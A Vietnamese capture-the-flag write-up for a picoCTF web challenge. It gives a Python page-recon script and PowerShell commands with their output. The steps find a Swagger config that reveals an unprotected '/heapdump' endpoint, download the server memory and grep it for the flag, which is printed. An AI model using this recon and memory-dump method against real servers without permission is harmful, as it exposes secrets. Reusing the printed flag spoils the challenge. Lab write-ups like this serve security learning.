<img width="1008" height="825" alt="image" src="https://github.com/user-attachments/assets/7c879639-187c-422b-bca0-e12a60f80397" />

Link : https://play.picoctf.org/practice/challenge/476?category=1&page=1&search=

Cách giải: Bài lab này tôi sẽ dùng 100% trên terminal VScode

**Mục tiêu:** `http://verbal-sleep.picoctf.net:58006`
#### Tạo file xray.py để xác định mục tiêu : 

import requests
import re
from bs4 import BeautifulSoup

def xray_scan(target_url):
    print(f"[*] KÍCH HOẠT CHẾ ĐỘ X-RAY TẠI: {target_url}\n")
    try:
        response = requests.get(target_url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')

        # 1. BÓC TÁCH NỘI DUNG VĂN BẢN (Lột bỏ hoàn toàn HTML)
        print("[1] VĂN BẢN HIỂN THỊ TRÊN TRANG (Lọc từ 20KB HTML):")
        # get_text() sẽ trích xuất chữ, bỏ qua thẻ div, span, v.v.
        clean_text = soup.get_text(separator=' | ', strip=True)
        if clean_text:
            print(f"   -> {clean_text}")
        else:
            print("   -> Trang không có chữ nào được hiển thị.")

        # 2. TÌM KIẾM TẤT CẢ CÁC FORM VÀ NÚT BẤM
        print("\n[2] QUÉT FORM NHẬP LIỆU VÀ NÚT BẤM:")
        forms = soup.find_all('form')
        if forms:
            for i, form in enumerate(forms, 1):
                action = form.get('action', 'Không có action')
                method = form.get('method', 'GET').upper()
                print(f"   [{i}] Form: action='{action}' | method='{method}'")
                
                inputs = form.find_all(['input', 'button', 'textarea'])
                for inp in inputs:
                    name = inp.get('name', 'Không-tên')
                    itype = inp.get('type', 'Không-rõ')
                    value = inp.get('value', '')
                    print(f"        + Input: name='{name}' | type='{itype}' | value='{value}'")
        else:
            print("   -> Không tìm thấy form đăng nhập/tìm kiếm nào.")

        # 3. SĂN TÌM ĐƯỜNG DẪN API VÀ FILE NGẦM BẰNG REGEX
        print("\n[3] SĂN TÌM API ENDPOINTS HOẶC FILE NGẦM:")
        # Bắt các đường dẫn dạng /api/get_flag, /login.php, /graphql, v.v.
        # Nằm rải rác trong code JS hoặc thuộc tính HTML
        paths = set(re.findall(r'(/[\w\-/]+\.(?:php|json|js|html)|/api/[\w\-/]+|/graphql)', response.text))
        
        # Bắt thêm các link nằm trong thẻ <a>
        for a in soup.find_all('a', href=True):
            href = a['href']
            if href.startswith('/') or href.startswith('http'):
                paths.add(href)

        if paths:
            for path in paths:
                print(f"   -> [NGHI VẤN] Đường dẫn ẩn: {path}")
        else:
            print("   -> Không phát hiện đường dẫn API nào rõ ràng.")

        # 4. TÌM KIẾM CHUỖI BASE64 NGHI NGỜ (Thường dùng để giấu Flag hoặc JWT)
        print("\n[4] QUÉT CHUỖI MÃ HÓA BASE64:")
        # Bắt các chuỗi dài hơn 20 ký tự, kết thúc bằng = hoặc ==
        b64_pattern = re.compile(r'[A-Za-z0-9+/]{20,}={1,2}')
        b64_matches = b64_pattern.findall(response.text)
        if b64_matches:
            for match in set(b64_matches):
                print(f"   -> [CẢNH BÁO] Tìm thấy Base64: {match}")
        else:
            print("   -> Không tìm thấy chuỗi Base64 nào đáng ngờ.")

    except Exception as e:
        print(f"[!] Lỗi X-Ray: {e}")

if __name__ == "__main__":
    target = "http://verbal-sleep.picoctf.net:58006/" 
    xray_scan(target)

### Bắt đầu tấn công

#### Bước 1: Quét bề mặt (Surface Reconnaissance)

*Câu hỏi của bạn: Làm gì để quét bề mặt?*

**Hành động:** Sử dụng PowerShell để phân tích cấu trúc DOM (HTML) của trang chủ mà không cần dùng trình duyệt.

* **Lệnh thực thi:**

  ```powershell
  wget http://verbal-sleep.picoctf.net:58006
  ```
* **Dẫn chứng thu được (Log):**
 wget http://verbal-sleep.picoctf.net:58006

Security Warning: Script Execution Risk
Invoke-WebRequest parses the content of the web page. Script code in the web page might be run when the  
page is parsed.
      RECOMMENDED ACTION:
      Use the -UseBasicParsing switch to avoid script code execution.

      Do you want to continue?

[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A

StatusCode        : 200
StatusDescription : OK
Content           : <!DOCTYPE html>
                    <html lang="en">
                    <head>
                        <meta charset="UTF-8">
                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
                        <title>picoCTF News</title>
                        <script src="https://c...
RawContent        : HTTP/1.1 200 OK
                    Connection: keep-alive
                    Keep-Alive: timeout=5
                    Content-Length: 20153
                    Content-Type: text/html; charset=utf-8
                    Date: Mon, 13 Apr 2026 18:54:37 GMT
                    ETag: W/"4eb9-jDprFwUyxeS6AyPrN28uWI...
Forms             : {}
Headers           : {[Connection, keep-alive], [Keep-Alive, timeout=5], [Content-Length, 20153],
                    [Content-Type, text/html; charset=utf-8]...}
Images            : {@{innerHTML=; innerText=; outerHTML=*[Image: Banner 
                    Profile]*; outerText=; tagName=IMG; class=w-full      
                    rounded-t-lg; alt=Banner Profile; src=/img/picoctf-logo-og.png}, @{innerHTML=;       
                    innerText=; outerHTML=*[Image: User Avatar]*; outerText=; tagName=IMG; class=w-8 h-8
                    rounded-full; alt=User Avatar; src=/img/picoctf-logo-og.png}, @{innerHTML=;
                    innerText=; outerHTML=*[Image: Post     
                    Image]*; outerText=; tagName=IMG; class=w-full h-48
                    object-cover rounded-md; alt=Post Image; src=/img/cyber.jpg}, @{innerHTML=;
                    innerText=; outerHTML=*[Image: User Avatar]*; outerText=; tagName=IMG; class=w-8 h-8
                    rounded-full; alt=User Avatar; src=/img/picoctf-logo-og.png}...}
InputFields       : {}
Links             : {@{innerHTML=Home ; innerText=Home ; outerHTML=<A class="text-blue-500
                    hover:underline" href="/">Home </A>; outerText=Home ; tagName=A;
                    class=text-blue-500 hover:underline; href=/}, @{innerHTML=About Us; innerText=About  
                    Us; outerHTML=<A class="text-blue-500 hover:underline" href="/about">About Us</A>;   
                    outerText=About Us; tagName=A; class=text-blue-500 hover:underline; href=/about},    
                    @{innerHTML=Services ; innerText=Services ; outerHTML=<A class="text-blue-500        
                    hover:underline" href="/services">Services </A>; outerText=Services ; tagName=A;     
                    class=text-blue-500 hover:underline; href=/services}, @{innerHTML=#cyberSecurity;    
                    innerText=#cyberSecurity; outerHTML=<A class=text-blue-600
                    href="">#cyberSecurity</A>; outerText=#cyberSecurity; tagName=A;
                    class=text-blue-600; href=}...}
ParsedHtml        : mshtml.HTMLDocumentClass
RawContentLength  : 20153

  Chú ý từ hệ thống :

  > `Forms : {}`

  > `Links : {@{innerHTML=Home...}, @{innerHTML=About Us...}, @{innerHTML=#cyberSecurity...}}`
* **Suy luận của tôi:**
1. `Forms : {}` khẳng định trang web này không có khung đăng nhập hay tìm kiếm $\rightarrow$ Loại bỏ hoàn toàn hướng tấn công SQL Injection.

2. Bằng chứng X-Ray (từ script Python trước đó) đọc được văn bản có cụm từ: `#swagger UI` và `#API Documentation` $\rightarrow$ Xác định mục tiêu giấu các API ngầm tại đường dẫn `/api-docs` (đường dẫn chuẩn của Swagger).
 python xray.py

[*] KÍCH HOẠT CHẾ ĐỘ X-RAY TẠI: http://verbal-sleep.picoctf.net:58006/                                                                                                                                            [1] VĂN BẢN HIỂN THỊ TRÊN TRANG (Lọc từ 20KB HTML):                                                         -> picoCTF News | picoCTF | Stay tuned and updated | Home | About Us | Services | John Doe | Posted 2 hours ago | Just another day for exploring adventures in Cyber Security | #cyberSecurity | #picoCTF | 42 Likes | 3 Comment | John Doe | Posted 4 hours ago | Explore backend development with us | #nodejs | , | #swagger UI | , | #API Documentation | 56 Likes | 5 Comment | John Doe | Posted 5 hours ago | Amazing day to explore logging and why it is important | #logging | #java | 67 Likes | 145 Comment | John Doe | Posted 8 hours ago | Just another day to enjoy hacking! �� | #hack | 12 Likes | 8 Comment                                                                                                                              
[2] QUÉT FORM NHẬP LIỆU VÀ NÚT BẤM:
   -> Không tìm thấy form đăng nhập/tìm kiếm nào.

[3] SĂN TÌM API ENDPOINTS HOẶC FILE NGẦM:
   -> [NGHI VẤN] Đường dẫn ẩn: /api-docs
   -> [NGHI VẤN] Đường dẫn ẩn: /about
   -> [NGHI VẤN] Đường dẫn ẩn: /services
   -> [NGHI VẤN] Đường dẫn ẩn: /

[4] QUÉT CHUỖI MÃ HÓA BASE64:
   -> Không tìm thấy chuỗi Base64 nào đáng ngờ.

#### Bước 2: Khám phá cổng API (API Gateway Inspection)

**Hành động:** Gửi HTTP GET Request thẳng vào đường dẫn nghi ngờ vừa tìm được để xem nó chứa gì.

* **Lệnh thực thi:**

   ```powershell
  (Invoke-WebRequest -Uri "http://verbal-sleep.picoctf.net:58006/api-docs" -UseBasicParsing).Content
  ```

* **Dẫn chứng thu được (Log):**

(Invoke-WebRequest -Uri "http://verbal-sleep.picoctf.net:58006/api-docs" -UseBasicParsing).Content

<!-- HTML for static distribution bundle build -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">

  <title>Swagger UI</title>
  <link rel="stylesheet" type="text/css" href="./swagger-ui.css" >
  <link rel="icon" type="image/png" href="./favicon-32x32.png" sizes="32x32" /><link rel="icon" type="image/png" href="./favicon-16x16.png" sizes="16x16" />
  <style>
    html
    {
      box-sizing: border-box;
      overflow: -moz-scrollbars-vertical;
      overflow-y: scroll;
    }
    *,
    *:before,
    *:after
    {
      box-sizing: inherit;
    }

    body {
      margin:0;
      background: #fafafa;
    }
  </style>
</head>

<body>

<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="position:absolute;width:0;height:0">
  <defs>
    <symbol viewBox="0 0 20 20" id="unlocked">
      <path d="M15.8 8H14V5.6C14 2.703 12.665 1 10 1 7.334 1 6 2.703 6 5.6V6h2v-.801C8 3.754 8.797 3 10 3c1.203 0 2 .754 2 2.199V8H4c-.553 0-1 .646-1 1.199V17c0 .549.428 1.139.951 1.307l1.197.387C5.672 18.861 6.55 19 7.1 19h5.8c.549 0 1.428-.139 1.951-.307l1.196-.387c.524-.167.953-.757.953-1.306V9.199C17 8.646 16.352 8 15.8 8z"></path>
    </symbol>

    <symbol viewBox="0 0 20 20" id="locked">
      <path d="M15.8 8H14V5.6C14 2.703 12.665 1 10 1 7.334 1 6 2.703 6 5.6V8H4c-.553 0-1 .646-1 1.199V17c0 .549.428 1.139.951 1.307l1.197.387C5.672 18.861 6.55 19 7.1 19h5.8c.549 0 1.428-.139 1.951-.307l1.196-.387c.524-.167.953-.757.953-1.306V9.199C17 8.646 16.352 8 15.8 8zM12 8H8V5.199C8 3.754 8.797 3 10 3c1.203 0 2 .754 2 2.199V8z"/>
    </symbol>

    <symbol viewBox="0 0 20 20" id="close">
      <path d="M14.348 14.849c-.469.469-1.229.469-1.697 0L10 11.819l-2.651 3.029c-.469.469-1.229.469-1.697 0-.469-.469-.469-1.229 0-1.697l2.758-3.15-2.759-3.152c-.469-.469-.469-1.228 0-1.697.469-.469 1.228-.469 1.697 0L10 8.183l2.651-3.031c.469-.469 1.228-.469 1.697 0 .469.469.469 1.229 0 1.697l-2.758 3.152 2.758 3.15c.469.469.469 1.229 0 1.698z"/>
    </symbol>

    <symbol viewBox="0 0 20 20" id="large-arrow">
      <path d="M13.25 10L6.109 2.58c-.268-.27-.268-.707 0-.979.268-.27.701-.27.969 0l7.83 7.908c.268.271.268.709 0 .979l-7.83 7.908c-.268.271-.701.27-.969 0-.268-.269-.268-.707 0-.979L13.25 10z"/>
    </symbol>

    <symbol viewBox="0 0 20 20" id="large-arrow-down">
      <path d="M17.418 6.109c.272-.268.709-.268.979 0s.271.701 0 .969l-7.908 7.83c-.27.268-.707.268-.979 0l-7.908-7.83c-.27-.268-.27-.701 0-.969.271-.268.709-.268.979 0L10 13.25l7.418-7.141z"/>
    </symbol>

    <symbol viewBox="0 0 24 24" id="jump-to">
      <path d="M19 7v4H5.83l3.58-3.59L8 6l-6 6 6 6 1.41-1.41L5.83 13H21V7z"/>
    </symbol>

    <symbol viewBox="0 0 24 24" id="expand">
      <path d="M10 18h4v-2h-4v2zM3 6v2h18V6H3zm3 7h12v-2H6v2z"/>
    </symbol>

  </defs>
</svg>

<div id="swagger-ui"></div>

<script src="./swagger-ui-bundle.js"> </script>
<script src="./swagger-ui-standalone-preset.js"> </script>
<script src="./swagger-ui-init.js"> </script>

                                                                                                                                                                                                                  <style>                                                                                                    .swagger-ui .topbar .download-url-wrapper { display: none } undefined                                  
</style>
</body>

</html>

  Hệ thống trả về mã HTML của một trang Swagger UI trống rỗng, nhưng ở cuối file có 3 dòng quan trọng:

  > `<script src="./swagger-ui-bundle.js"> </script>`
  
  > `<script src="./swagger-ui-standalone-preset.js"> </script>`
  
  > `**<script src="./swagger-ui-init.js"> </script>**`

* **Suy luận :** Trang HTML này chỉ là vỏ bọc.

   Toàn bộ sơ đồ API (đường link, chức năng) đã được lập trình viên đóng gói và cấu hình trong file `swagger-ui-init.js` nằm **cùng thư mục**.

#### Bước 3: Đánh cắp bản đồ hệ thống (Extracting API Mapping)

**Hành động:** Tải mã nguồn của file JavaScript cấu hình vừa phát hiện để đọc trộm sơ đồ nội bộ.

* **Lệnh thực thi:** *(Lưu ý đường dẫn phải nối thêm tên file vào sau `/api-docs/`)*

  ```powershell
  (Invoke-WebRequest -Uri "http://verbal-sleep.picoctf.net:58006/api-docs/swagger-ui-init.js" -UseBasicParsing).Content
  ```

* **Dẫn chứng thu được (Log):**
(Invoke-WebRequest -Uri "http://verbal-sleep.picoctf.net:58006/api-docs/swagger-ui-init.js" -UseBasicParsing).Content

window.onload = function() {
  // Build a system
  var url = window.location.search.match(/url=([^&]+)/);
  if (url && url.length > 1) {
    url = decodeURIComponent(url[1]);
  } else {
    url = window.location.origin;
  }
  var options = {
  "swaggerDoc": {
    "openapi": "3.0.0",
    "info": {
      "title": "picoCTF News API",
      "version": "1.0.0",
      "description": "Welcome to the picoCTF News API documentation! This documentation provides a detailed overview of the available API endpoints for managing and retrieving news posts."
    },
    "paths": {
      "/": {
        "get": {
          "tags": [
            "Free"
          ],
          "summary": "Welcome page",
          "responses": {
            "200": {
              "description": "Returns a welcome message."
            }
          }
        }
      },
      "/about": {
        "get": {
          "tags": [
            "Free"
          ],
          "summary": "About Us",
          "responses": {
            "200": {
              "description": "Returns information about us."
            }
          }
        }
      },
      "/services": {
        "get": {
          "tags": [
            "Free"
          ],
          "summary": "Services",
          "responses": {
            "200": {
              "description": "Returns a list of services."
            }
          }
        }
      },
      "/heapdump": {
        "get": {
          "tags": [
            "Diagnosing"
          ],
          "summary": "Diagnosing the memory allocation.",
          "responses": {
            "200": {
              "description": "Returns a memory allocation status."
            }
          }
        }
      },
      "/api/posts": {
        "get": {
          "tags": [
            "Posts"
          ],
          "summary": "Get all posts",
          "responses": {
            "200": {
              "description": "Returns a list of all posts.",
              "content": {
                "application/json": {
                  "schema": {
                    "type": "array",
                    "items": {
                      "type": "object",
                      "properties": {
                        "id": {
                          "type": "string",
                          "example": "1"
                        },
                        "title": {
                          "type": "string",
                          "example": "My First Post"
                        },
                        "content": {
                          "type": "string",
                          "example": "This is the content of my first post."
                        },
                        "author": {
                          "type": "string",
                          "example": "John Doe"
                        },
                        "createdAt": {
                          "type": "string",
                          "format": "date-time",
                          "example": "2024-07-02T00:00:00Z"
                        },
                        "updatedAt": {
                          "type": "string",
                          "format": "date-time",
                          "example": "2024-07-02T00:00:00Z"
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "post": {
          "tags": [
            "Posts"
          ],
          "summary": "Create a new post",
          "requestBody": {
            "required": true,
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "properties": {
                    "title": {
                      "type": "string",
                      "example": "My New Post"
                    },
                    "content": {
                      "type": "string",
                      "example": "Content of the new post."
                    },
                    "author": {
                      "type": "string",
                      "example": "Alice"
                    }
                  }
                }
              }
            }
          },
          "responses": {
            "201": {
              "description": "Post created successfully.",
              "content": {
                "application/json": {
                  "schema": {
                    "type": "object",
                    "properties": {
                      "id": {
                        "type": "string",
                        "example": "3"
                      },
                      "title": {
                        "type": "string",
                        "example": "My New Post"
                      },
                      "content": {
                        "type": "string",
                        "example": "Content of the new post."
                      },
                      "author": {
                        "type": "string",
                        "example": "Alice"
                      },
                      "createdAt": {
                        "type": "string",
                        "format": "date-time",
                        "example": "2024-07-02T00:00:00Z"
                      },
                      "updatedAt": {
                        "type": "string",
                        "format": "date-time",
                        "example": "2024-07-02T00:00:00Z"
                      }
                    }
                  }
                }
              }
            }
          }
        }
      },
      "/api/posts/{id}": {
        "get": {
          "tags": [
            "Posts"
          ],
          "summary": "Get a post by ID",
          "parameters": [
            {
              "name": "id",
              "in": "path",
              "required": true,
              "description": "The ID of the post to retrieve",
              "schema": {
                "type": "string",
                "example": "1"
              }
            }
          ],
          "responses": {
            "200": {
              "description": "Returns a post by ID.",
              "content": {
                "application/json": {
                  "schema": {
                    "type": "object",
                    "properties": {
                      "id": {
                        "type": "string",
                        "example": "1"
                      },
                      "title": {
                        "type": "string",
                        "example": "My First Post"
                      },
                      "content": {
                        "type": "string",
                        "example": "This is the content of my first post."
                      },
                      "author": {
                        "type": "string",
                        "example": "John Doe"
                      },
                      "createdAt": {
                        "type": "string",
                        "format": "date-time",
                        "example": "2024-07-02T00:00:00Z"
                      },
                      "updatedAt": {
                        "type": "string",
                        "format": "date-time",
                        "example": "2024-07-02T00:00:00Z"
                      }
                    }
                  }
                }
              }
            },
            "404": {
              "description": "Post not found."
            }
          }
        },
        "put": {
          "tags": [
            "Posts"
          ],
          "summary": "Update a post by ID",
          "parameters": [
            {
              "name": "id",
              "in": "path",
              "required": true,
              "description": "The ID of the post to update",
              "schema": {
                "type": "string",
                "example": "1"
              }
            }
          ],
          "requestBody": {
            "required": true,
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "properties": {
                    "title": {
                      "type": "string",
                      "example": "Updated Title"
                    },
                    "content": {
                      "type": "string",
                      "example": "Updated content of the post."
                    },
                    "author": {
                      "type": "string",
                      "example": "John Doe"
                    }
                  }
                }
              }
            }
          },
          "responses": {
            "200": {
              "description": "Post updated successfully.",
              "content": {
                "application/json": {
                  "schema": {
                    "type": "object",
                    "properties": {
                      "id": {
                        "type": "string",
                        "example": "1"
                      },
                      "title": {
                        "type": "string",
                        "example": "Updated Title"
                      },
                      "content": {
                        "type": "string",
                        "example": "Updated content of the post."
                      },
                      "author": {
                        "type": "string",
                        "example": "John Doe"
                      },
                      "createdAt": {
                        "type": "string",
                        "format": "date-time",
                        "example": "2024-07-02T00:00:00Z"
                      },
                      "updatedAt": {
                        "type": "string",
                        "format": "date-time",
                        "example": "2024-07-02T00:00:00Z"
                      }
                    }
                  }
                }
              }
            },
            "404": {
              "description": "Post not found."
            }
          }
        },
        "delete": {
          "tags": [
            "Posts"
          ],
          "summary": "Delete a post by ID",
          "parameters": [
            {
              "name": "id",
              "in": "path",
              "required": true,
              "description": "The ID of the post to delete",
              "schema": {
                "type": "string",
                "example": "1"
              }
            }
          ],
          "responses": {
            "200": {
              "description": "Post deleted successfully."
            },
            "404": {
              "description": "Post not found."
            }
          }
        }
      }
    },
    "components": {},
    "tags": [
      {
        "name": "Free",
        "description": "API endpoints for navigating the website."
      },
      {
        "name": "Posts",
        "description": "API endpoints for managing posts."
      }
    ]
  },
  "customOptions": {}
};
  url = options.swaggerUrl || url
  var urls = options.swaggerUrls
  var customOptions = options.customOptions
  var spec1 = options.swaggerDoc
  var swaggerOptions = {
    spec: spec1,
    url: url,
    urls: urls,
    dom_id: '#swagger-ui',
    deepLinking: true,
    presets: [
      SwaggerUIBundle.presets.apis,
      SwaggerUIStandalonePreset
    ],
    plugins: [
      SwaggerUIBundle.plugins.DownloadUrl
    ],
    layout: "StandaloneLayout"
  }
  for (var attrname in customOptions) {
    swaggerOptions[attrname] = customOptions[attrname];
  }
  var ui = SwaggerUIBundle(swaggerOptions)

  if (customOptions.oauth) {
    ui.initOAuth(customOptions.oauth)
  }                                                                                                                                                                                                                 if (customOptions.preauthorizeApiKey) {                                                                    const key = customOptions.preauthorizeApiKey.authDefinitionKey;                                      
    const value = customOptions.preauthorizeApiKey.apiKeyValue;
    if (!!key && !!value) {
      const pid = setInterval(() => {
        const authorized = ui.preauthorizeApiKey(key, value);
        if(!!authorized) clearInterval(pid);
      }, 500)

    }
  }

  if (customOptions.authAction) {
    ui.authActions.authorize(customOptions.authAction)
  }

  window.ui = ui
}

Hệ thống trả về một mảng JSON (Bản đồ kho báu), trong đó có chứa một endpoint bất thường:

  > `"paths": {`
  > `  "/heapdump": {`
  > `    "get": { "tags": ["Diagnosing"], "summary": "Diagnosing the memory allocation." }`
  > `  }`
  > `}`

* **Suy luận :** Lập trình viên đã mắc lỗi chí mạng khi để lộ API `/heapdump`.
  API này cho phép bất kỳ ai gọi đến nó cũng có thể tải về trạng thái bộ nhớ RAM của máy chủ (nơi lưu trữ mọi biến số, mật khẩu, và Flag).

#### Bước 4: Tấn công rò rỉ bộ nhớ & Bóc tách Flag (Memory Dump & Extraction)

**Hành động:** Gọi API `/heapdump` để ép server nôn RAM ra, lưu thành file để máy tính không bị treo vì dữ liệu rác, sau đó dùng công cụ dò tìm để lọc chữ.

* **Lệnh thực thi 1 (Tải bộ nhớ):**

  ```powershell
  Invoke-WebRequest -Uri "http://verbal-sleep.picoctf.net:58006/heapdump" -OutFile "memory.txt"
  ```

* **Lệnh thực thi 2 (Lọc Flag):**

  ```powershell
  Select-String -Path "memory.txt" -Pattern "picoCTF{"
  ```

* **Dẫn chứng thu được (Log):**

  > memory.txt:5:picoCTF{Pat!3nt_15_Th3_K3y_546786ba}
  > 

Hệ thống đã bị khai thác thành công thông qua chuỗi: Lộ cấu hình API $\rightarrow$ Gọi hàm Debug trái phép $\rightarrow$ Lộ dữ liệu bộ nhớ.

Cảm ơn các bạn đã đọc bài viết của tôi . Chúc các bạn thành công giải lab và hiểu được bài . Wish you have all the best!!!!!!!!!
